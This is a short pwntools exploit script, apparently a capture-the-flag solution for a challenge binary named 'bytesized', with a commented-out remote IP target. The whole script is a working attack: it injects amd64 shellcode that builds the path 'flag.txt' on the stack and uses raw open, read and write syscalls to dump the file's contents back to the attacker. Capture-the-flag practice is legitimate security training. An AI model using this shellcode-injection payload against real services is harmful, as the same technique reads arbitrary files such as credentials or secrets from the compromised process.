from pwn import *

io = process("./bytesized")
#io = remote("15.206.149.154", 30012)
context.log_level = 'debug' 
context.arch = "amd64"
gdb.attach(io)
payload = asm('''mov dword ptr [rsp], 0x67616c66
mov dword ptr [rsp+4], 0x7478742e

lea rdi, [rsp]
mov rax, 2
xor rsi, rsi
xor rdx, rdx
syscall

mov rdi, rax
lea rsi, [rsp]
mov rdx, 200
xor rax, rax
syscall

mov rdi, 1
lea rsi, [rsp]
mov rdx, rax
mov rax, 1
syscall
''')
io.recvuntil("es)==>\n")
io.sendline(payload)
io.interactive()
